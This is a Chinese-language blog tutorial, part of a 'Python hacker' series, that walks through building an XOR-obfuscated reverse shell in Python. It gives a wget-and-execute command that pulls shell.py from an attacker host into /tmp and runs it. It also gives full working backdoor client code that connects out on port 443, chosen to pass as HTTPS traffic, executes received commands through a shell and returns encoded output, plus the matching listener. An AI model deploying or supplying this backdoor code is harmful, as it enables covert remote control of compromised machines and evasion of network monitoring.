---
layout: post
title: Python黑客之旅0x3
categories: Python Hacker
tags: Python黑客之旅
---

* TOC 
{:toc}

## 反向shell






参考阅读:[什么是反向Shell](http://os.51cto.com/art/201312/424378.htm)

这篇教程将会教你使用Python编写一个反向shell，首先我们先演示使用Python如何利用web服务器的功能，把文件从另一台主机传送过来。我们假设你有一台傀儡主机，你现在想下载傀儡机上面的的文件。那么你就可以使用shell(或meterpreter)去访问这台傀儡机，你可以通过一行Python代码把傀儡机建立成为一个web服务器，然后下载傀儡机上面的文件.

创建一个python HTTP服务器可以直接使用python的内建函数"SimpleHTTPServer"来创建，你可以使用'-m'参数直接在命令行调用模块，创建的服务器默认是监听的8000端口，但是你可以指定端口，直接在'SimpleHTTPServer'后面跟一个端口参数:

``` python
python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 80 ...
```

我们假设你没有防火墙去阻止你的连接，那么你是可以请求到这服务器的数据。你可以在任何目录里面去启动Python HTTP服务器，这样你就能够通过浏览器或者是远程客户端来访问这个目录。这里有一个简单的例子告诉你使用wget工具去获取文件,但是有些时候就会经常发现你根本没有权限在当前目录写入文件并且初始化这个脚本，但是你可以改变脚本执行的目录，下面这个例子就演示了把脚本在/tmp目录下面执行：

``` python
#使用-O参数，把文件保存在其他目录- /tmp/ 一般可写
wget -O /tmp/shell.py http://<attacker_ip>/shell.py
 
#修改权限
chmod a+x /tmp/shell.py
 
# 使用file命令检查文件是否正确
file /tmp/shell.py
 
#执行脚本
/usr/bin/python /tmp/shell.py
```

## 客户端反向shell代码

阅读下面的后门代码。编码时会使用到`socket`，`subprocess`和`sys`模块，选择`subprocess`模块原因，是因为它允许使用一个变量储存STDOUT输出的结果，之后可以在代码中的其他部分通过调用此变量访问保存的STDOUT数据。下面的代码中：所建立的连接会监听`443`端口。`443`端口经常用在**https**上，这里使用`443`端口可以起到混淆视听的作用:

``` python
#!/usr/bin/python
 
import socket,subprocess,sys
 
RHOST = sys.argv[1]
RPORT = 443
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))
 
while True:
     # 从socket中接收XOR编码的数据
     data = s.recv(1024)
 
     # XOR the data again with a '\x41' to get back to normal data
     en_data = bytearray(data)
     for i in range(len(en_data)):
       en_data[i] ^=0x41
 
     # 执行解码命令，subprocess模块能够通过PIPE STDOUT/STDERR/STDIN把值赋值给一个变量
     comm = subprocess.Popen(str(en_data), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     comm.wait()
     STDOUT, STDERR = comm.communicate()
 
     # 输出编码后的数据并且发送给指定的主机RHOST
     en_STDOUT = bytearray(STDOUT)
     for i in range(len(en_STDOUT)):
       en_STDOUT[i] ^=0x41
     s.send(en_STDOUT)
s.close()
```

上面的代码中有些概念已经在[0x2](http://www.kionf.com/python/2015/10/14/pythonhacker_0x2.html)介绍过了，但是除了之前的使用socket创建一个连接之外，我们通过subprocess模块执行了一个命令，`subprocess`模块非常的方便，它允许你通过STDOUT/STDERR命令直接把值赋值给一个变量，然后我们可以通过命令把输出的进行编码然后通过socket网络发送出去。

使用OXR的好处就是你能够很容易编码你要发送过去的数据，然后通过相同的密钥来解码返回的数据，最后解码后的数据可以以明文的形式去执行命令。


## 服务端监听shell代码

现在为了利用好这个后门，我们需要一个监听脚本并且解码后端传输过来的数据，让我们通过明文很清晰的看清楚返回的数据。

下面我们将要设计一个监听器。来获取反向shell的数据，并且能够对于输入／输出的进行解码/编码，为了能够在终端上面能够很清晰的看出来，所以需要使用XOR编码:

{% highlight python %}
import socket 

s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(("0.0.0.0", 443))
s.listen(2)
print "Listening on port 443... "
(client, (ip, port)) = s.accept()
print " Received connection from : ", ip

while True:
 command = raw_input('~$ ')
 encode = bytearray(command)
 for i in range(len(encode)):
   encode[i] ^=0x41
 client.send(encode)
 en_data=client.recv(2048)
 decode = bytearray(en_data)
 for i in range(len(decode)):
   decode[i] ^=0x41
 print decode
 
client.close()
s.close()

{% endhighlight %}

> 这章的例子非常有趣，对于学习信息安全的朋友都喜欢shell，大家可以对代码做点修改让这个脚本也能够在window上面也能够正常运行，最后大家可以使用`base64`来代替XOR进行编码与解码，这些练习让你你更加熟练的使用python.下一章

